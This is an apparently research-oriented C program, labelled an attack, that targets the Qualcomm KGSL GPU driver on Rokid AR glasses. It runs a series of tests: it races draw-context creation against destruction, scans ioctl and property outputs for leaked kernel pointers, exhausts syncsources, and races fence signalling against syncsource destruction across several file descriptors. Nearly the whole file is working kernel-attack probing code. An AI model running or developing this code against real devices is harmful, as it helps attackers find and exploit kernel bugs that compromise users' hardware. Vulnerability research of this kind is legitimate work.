/*
 * KGSL Context Confusion Attack
 * ==============================
 *
 * Strategy: Exploit the fact that fd2 mapping survives fd1 close
 * but targets KGSL internal structures rather than GPU memory content.
 *
 * Research vectors:
 * 1. KGSL_PERFCOUNTER - May leak kernel addresses
 * 2. KGSL_CMDSTREAM_READTIMESTAMP - GPU timestamp with kernel state
 * 3. KGSL_DRAWCTXT_CREATE/DESTROY - Context management race
 * 4. KGSL_GPUOBJ_INFO - Object info may leak addresses
 *
 * Compile:
 * aarch64-linux-android31-clang -static -O2 -pthread -o kgsl_context_attack kgsl_context_attack.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

// ============================================================================
// KGSL IOCTL Definitions
// ============================================================================

#define KGSL_IOC_TYPE 0x09

// Draw context operations
#define IOCTL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct drawctxt_create)
#define IOCTL_DRAWCTXT_DESTROY _IOW(KGSL_IOC_TYPE, 0x14, struct drawctxt_destroy)

// GPU memory operations
#define IOCTL_GPUMEM_ALLOC 0xc018092f
#define IOCTL_GPUMEM_FREE _IOW(KGSL_IOC_TYPE, 0x15, struct gpumem_free)
#define IOCTL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x36, struct gpuobj_info)

// Timestamp operations
#define IOCTL_READTIMESTAMP _IOWR(KGSL_IOC_TYPE, 0x11, struct readtimestamp)
#define IOCTL_TIMESTAMP_EVENT _IOWR(KGSL_IOC_TYPE, 0x33, struct timestamp_event)

// Perfcounter operations
#define IOCTL_PERFCOUNTER_GET _IOWR(KGSL_IOC_TYPE, 0x3A, struct perfcounter_get)
#define IOCTL_PERFCOUNTER_PUT _IOW(KGSL_IOC_TYPE, 0x3B, struct perfcounter_put)
#define IOCTL_PERFCOUNTER_QUERY _IOWR(KGSL_IOC_TYPE, 0x3C, struct perfcounter_query)
#define IOCTL_PERFCOUNTER_READ _IOWR(KGSL_IOC_TYPE, 0x3D, struct perfcounter_read)

// SyncSource operations (confirmed working)
#define IOCTL_SYNCSOURCE_CREATE _IOWR(KGSL_IOC_TYPE, 0x40, struct syncsource_create)
#define IOCTL_SYNCSOURCE_DESTROY _IOW(KGSL_IOC_TYPE, 0x41, struct syncsource_destroy)
#define IOCTL_SYNCSOURCE_CREATE_FENCE _IOWR(KGSL_IOC_TYPE, 0x42, struct syncsource_create_fence)
#define IOCTL_SYNCSOURCE_SIGNAL_FENCE _IOWR(KGSL_IOC_TYPE, 0x43, struct syncsource_signal_fence)

// Properties
#define IOCTL_GETPROPERTY _IOWR(KGSL_IOC_TYPE, 0x02, struct device_getproperty)

// ============================================================================
// Structure Definitions
// ============================================================================

struct gpumem_alloc_req
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

struct gpumem_free
{
    unsigned long gpuaddr;
    unsigned int type;
};

struct drawctxt_create
{
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct drawctxt_destroy
{
    unsigned int drawctxt_id;
};

struct gpuobj_info
{
    uint64_t gpuaddr;
    uint64_t id;
    uint64_t size;
    uint32_t flags;
    uint32_t va_len;
    uint64_t va_addr;
    uint32_t padding[4];
};

struct readtimestamp
{
    unsigned int type;
    unsigned int timestamp;
};

struct timestamp_event
{
    int type;
    unsigned int timestamp;
    unsigned int context_id;
    int fd;
    unsigned int priv_data_len;
    unsigned int priv_data;
};

struct perfcounter_get
{
    unsigned int groupid;
    unsigned int countable;
    unsigned int offset;
    unsigned int offset_hi;
    unsigned int __pad;
};

struct perfcounter_put
{
    unsigned int groupid;
    unsigned int countable;
};

struct perfcounter_query
{
    unsigned int groupid;
    unsigned int *countables;
    unsigned int count;
    unsigned int max_counters;
    unsigned int __pad[2];
};

struct perfcounter_read
{
    unsigned int *reads;
    unsigned int count;
};

struct syncsource_create
{
    unsigned int id;
};

struct syncsource_destroy
{
    unsigned int id;
};

struct syncsource_create_fence
{
    unsigned int id;
    int fence_fd;
};

struct syncsource_signal_fence
{
    unsigned int id;
    int fence_fd;
};

struct device_getproperty
{
    unsigned int type;
    void *value;
    size_t sizebytes;
};

// ============================================================================
// Global
// ============================================================================

static int kgsl_fd = -1;

// ============================================================================
// Draw Context Race
// ============================================================================

static volatile int race_stop = 0;
static volatile int races_won = 0;
static volatile unsigned int race_ctxid = 0;

void *context_create_thread(void *arg)
{
    while (!race_stop)
    {
        struct drawctxt_create req = {0};
        if (ioctl(kgsl_fd, IOCTL_DRAWCTXT_CREATE, &req) == 0)
        {
            race_ctxid = req.drawctxt_id;
        }
        usleep(1);
    }
    return NULL;
}

void *context_destroy_thread(void *arg)
{
    while (!race_stop)
    {
        if (race_ctxid > 0)
        {
            struct drawctxt_destroy req = {.drawctxt_id = race_ctxid};
            ioctl(kgsl_fd, IOCTL_DRAWCTXT_DESTROY, &req);
            races_won++;
        }
        usleep(1);
    }
    return NULL;
}

void test_context_race(void)
{
    printf("\n=== Test 1: Draw Context Race ===\n");

    race_stop = 0;
    races_won = 0;
    race_ctxid = 0;

    pthread_t t1, t2;
    pthread_create(&t1, NULL, context_create_thread, NULL);
    pthread_create(&t2, NULL, context_destroy_thread, NULL);

    usleep(50000); // 50ms
    race_stop = 1;

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    printf("[+] Context create/destroy races: %d\n", races_won);
}

// ============================================================================
// GPU Object Info Leak
// ============================================================================

void test_gpuobj_info(void)
{
    printf("\n=== Test 2: GPU Object Info Leak ===\n");

    // First allocate some GPU memory
    uint64_t gpuaddr;
    struct gpumem_alloc_req alloc_req = {.size = 0x1000};
    if (ioctl(kgsl_fd, IOCTL_GPUMEM_ALLOC, &alloc_req) < 0)
    {
        printf("[-] Alloc failed\n");
        return;
    }
    gpuaddr = alloc_req.gpuaddr;
    printf("[+] Allocated gpuaddr=0x%lx\n", gpuaddr);

    // Query object info
    struct gpuobj_info info_req = {.gpuaddr = gpuaddr};
    int ret = ioctl(kgsl_fd, IOCTL_GPUOBJ_INFO, &info_req);
    if (ret == 0)
    {
        printf("[+] GPUOBJ_INFO returned:\n");
        printf("    gpuaddr: 0x%lx\n", info_req.gpuaddr);
        printf("    id: 0x%lx\n", info_req.id);
        printf("    size: 0x%lx\n", info_req.size);
        printf("    flags: 0x%x\n", info_req.flags);
        printf("    va_len: 0x%x\n", info_req.va_len);
        printf("    va_addr: 0x%lx\n", info_req.va_addr);

        // Check for kernel addresses
        if ((info_req.va_addr & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL)
        {
            printf("[!!!] KERNEL ADDRESS LEAKED: 0x%lx\n", info_req.va_addr);
        }
    }
    else
    {
        printf("[-] GPUOBJ_INFO failed: %s\n", strerror(errno));
    }
}

// ============================================================================
// Perfcounter Probe
// ============================================================================

void test_perfcounter(void)
{
    printf("\n=== Test 3: Performance Counter Probe ===\n");

    // Query available perfcounters
    for (unsigned int gid = 0; gid < 32; gid++)
    {
        unsigned int countables[256];
        struct perfcounter_query query_req = {
            .groupid = gid,
            .countables = countables,
            .count = 256,
            .max_counters = 0};

        int ret = ioctl(kgsl_fd, IOCTL_PERFCOUNTER_QUERY, &query_req);
        if (ret == 0 && query_req.max_counters > 0)
        {
            printf("[+] Perfcounter group %d: %d counters\n", gid, query_req.max_counters);

            // Try to get a counter
            struct perfcounter_get get_req = {
                .groupid = gid,
                .countable = 0};

            if (ioctl(kgsl_fd, IOCTL_PERFCOUNTER_GET, &get_req) == 0)
            {
                printf("    offset=0x%x, offset_hi=0x%x\n",
                       get_req.offset, get_req.offset_hi);

                // Check if these could be kernel addresses
                if (get_req.offset > 0x10000 || get_req.offset_hi > 0)
                {
                    printf("[!] Unusual offset values - potential leak?\n");
                }

                // Put it back
                struct perfcounter_put put_req = {
                    .groupid = gid,
                    .countable = 0};
                ioctl(kgsl_fd, IOCTL_PERFCOUNTER_PUT, &put_req);
            }
        }
    }
}

// ============================================================================
// Timestamp Probe
// ============================================================================

void test_timestamp(void)
{
    printf("\n=== Test 4: Timestamp Info ===\n");

    // Create a draw context first
    struct drawctxt_create ctx_req = {0};
    if (ioctl(kgsl_fd, IOCTL_DRAWCTXT_CREATE, &ctx_req) < 0)
    {
        printf("[-] Create context failed\n");
        return;
    }
    printf("[+] Created context: id=%d\n", ctx_req.drawctxt_id);

    // Read timestamps
    for (int type = 0; type < 4; type++)
    {
        struct readtimestamp ts_req = {.type = type};
        if (ioctl(kgsl_fd, IOCTL_READTIMESTAMP, &ts_req) == 0)
        {
            printf("[+] Timestamp type %d: %u (0x%x)\n",
                   type, ts_req.timestamp, ts_req.timestamp);
        }
    }

    // Cleanup
    struct drawctxt_destroy destroy_req = {.drawctxt_id = ctx_req.drawctxt_id};
    ioctl(kgsl_fd, IOCTL_DRAWCTXT_DESTROY, &destroy_req);
}

// ============================================================================
// SyncSource Exhaustion Attack
// ============================================================================

void test_syncsource_exhaustion(void)
{
    printf("\n=== Test 5: SyncSource Exhaustion ===\n");

    unsigned int sync_ids[4096];
    int count = 0;

    // Create as many syncsources as possible
    while (count < 4096)
    {
        struct syncsource_create req = {0};
        if (ioctl(kgsl_fd, IOCTL_SYNCSOURCE_CREATE, &req) < 0)
        {
            break;
        }
        sync_ids[count++] = req.id;
    }
    printf("[+] Created %d syncsources (max IDs)\n", count);

    if (count > 0)
    {
        printf("[+] ID range: %d - %d\n", sync_ids[0], sync_ids[count - 1]);

        // Check for patterns
        if (sync_ids[count - 1] - sync_ids[0] + 1 == count)
        {
            printf("[*] Sequential IDs (no ID reuse gap)\n");
        }
        else
        {
            printf("[*] Non-sequential IDs detected - potential race opportunity\n");
        }
    }

    // Create fences for first 100
    int fence_count = 0;
    int fence_fds[100];
    for (int i = 0; i < count && i < 100; i++)
    {
        struct syncsource_create_fence req = {.id = sync_ids[i]};
        if (ioctl(kgsl_fd, IOCTL_SYNCSOURCE_CREATE_FENCE, &req) == 0)
        {
            fence_fds[fence_count++] = req.fence_fd;
        }
    }
    printf("[+] Created %d fences\n", fence_count);

    // Close fences
    for (int i = 0; i < fence_count; i++)
    {
        close(fence_fds[i]);
    }

    // Destroy syncsources
    for (int i = 0; i < count; i++)
    {
        struct syncsource_destroy req = {.id = sync_ids[i]};
        ioctl(kgsl_fd, IOCTL_SYNCSOURCE_DESTROY, &req);
    }
    printf("[+] Cleaned up syncsources\n");
}

// ============================================================================
// Property Deep Dump
// ============================================================================

void hexdump(const void *data, size_t size)
{
    const uint8_t *p = (const uint8_t *)data;
    for (size_t i = 0; i < size; i++)
    {
        if (i % 32 == 0 && i > 0)
            printf("\n");
        printf("%02x", p[i]);
    }
    printf("\n");
}

void test_property_deep(void)
{
    printf("\n=== Test 6: Property Deep Dump ===\n");

    // Properties that might contain interesting data
    unsigned int interesting[] = {
        0x01, // DEVICE_INFO
        0x02, // SHADOW_MEMORY
        0x0C, // GPU_MODEL
        0x0D, // GPUCLK
        0x0E, // PWRCTRL
        0x0F, // INTERRUPT_WAITS
        0x10, // UCHE_GMEM_VADDR
        0x11, // SP_GENERIC_MEM
        0x12, // SECURE_BUFFER_ALIGNMENT
        0x20, // CONTEXT_PROPERTY
        0x21, // GPUHTW_MEMTYPE
        0x25, // PWRCTRL_VERSION
    };

    for (int i = 0; i < sizeof(interesting) / sizeof(interesting[0]); i++)
    {
        uint8_t buf[1024] = {0};
        struct device_getproperty req = {
            .type = interesting[i],
            .value = buf,
            .sizebytes = sizeof(buf)};

        if (ioctl(kgsl_fd, IOCTL_GETPROPERTY, &req) == 0)
        {
            // Check for kernel pointers
            uint64_t *vals = (uint64_t *)buf;
            int found_kptr = 0;
            for (int j = 0; j < 128; j++)
            {
                if ((vals[j] & 0xFFFFFF8000000000ULL) == 0xFFFFFF8000000000ULL)
                {
                    printf("[!!!] Property 0x%02x has kernel ptr at +%d: 0x%lx\n",
                           interesting[i], j * 8, vals[j]);
                    found_kptr = 1;
                }
            }

            if (!found_kptr)
            {
                printf("[*] Property 0x%02x: ", interesting[i]);
                hexdump(buf, 64);
            }
        }
    }
}

// ============================================================================
// Multi-FD SyncSource Race
// ============================================================================

static int race_fds[4];
static unsigned int shared_sync_id = 0;
static volatile int signal_success = 0;
static volatile int destroy_done = 0;

void *signal_thread(void *arg)
{
    int idx = (int)(long)arg;
    int fd = race_fds[idx];

    while (!destroy_done && shared_sync_id > 0)
    {
        struct syncsource_create_fence fence_req = {.id = shared_sync_id};
        if (ioctl(fd, IOCTL_SYNCSOURCE_CREATE_FENCE, &fence_req) == 0)
        {
            struct syncsource_signal_fence sig_req = {
                .id = shared_sync_id,
                .fence_fd = fence_req.fence_fd};
            if (ioctl(fd, IOCTL_SYNCSOURCE_SIGNAL_FENCE, &sig_req) == 0)
            {
                signal_success++;
            }
            close(fence_req.fence_fd);
        }
    }
    return NULL;
}

void *destroy_thread_multi(void *arg)
{
    usleep(500); // Let signals start
    struct syncsource_destroy req = {.id = shared_sync_id};
    ioctl(race_fds[0], IOCTL_SYNCSOURCE_DESTROY, &req);
    destroy_done = 1;
    return NULL;
}

void test_multi_fd_race(void)
{
    printf("\n=== Test 7: Multi-FD SyncSource Race ===\n");

    // Open multiple KGSL fds
    for (int i = 0; i < 4; i++)
    {
        race_fds[i] = open("/dev/kgsl-3d0", O_RDWR);
        if (race_fds[i] < 0)
        {
            printf("[-] Failed to open fd %d\n", i);
            return;
        }
    }
    printf("[+] Opened 4 KGSL file descriptors\n");

    int attempts = 20;
    int crashes = 0;

    for (int a = 0; a < attempts; a++)
    {
        // Create syncsource on fd[0]
        struct syncsource_create create_req = {0};
        if (ioctl(race_fds[0], IOCTL_SYNCSOURCE_CREATE, &create_req) < 0)
        {
            continue;
        }
        shared_sync_id = create_req.id;
        signal_success = 0;
        destroy_done = 0;

        // Race: multiple fds try to signal while one destroys
        pthread_t threads[5];
        for (int i = 0; i < 4; i++)
        {
            pthread_create(&threads[i], NULL, signal_thread, (void *)(long)i);
        }
        pthread_create(&threads[4], NULL, destroy_thread_multi, NULL);

        for (int i = 0; i < 5; i++)
        {
            pthread_join(threads[i], NULL);
        }

        if (signal_success > 0 && destroy_done)
        {
            crashes++;
        }
    }

    printf("[*] Race attempts: %d/%d with post-destroy signals\n", crashes, attempts);

    // Cleanup
    for (int i = 0; i < 4; i++)
    {
        close(race_fds[i]);
    }
}

// ============================================================================
// Main
// ============================================================================

int main(int argc, char **argv)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL Context Confusion Attack Research                       ║\n");
    printf("║  Target: Rokid AR Glasses                                     ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0: fd=%d\n", kgsl_fd);

    test_context_race();
    test_gpuobj_info();
    test_perfcounter();
    test_timestamp();
    test_syncsource_exhaustion();
    test_property_deep();
    test_multi_fd_race();

    close(kgsl_fd);

    printf("\n=== Research Complete ===\n");
    return 0;
}
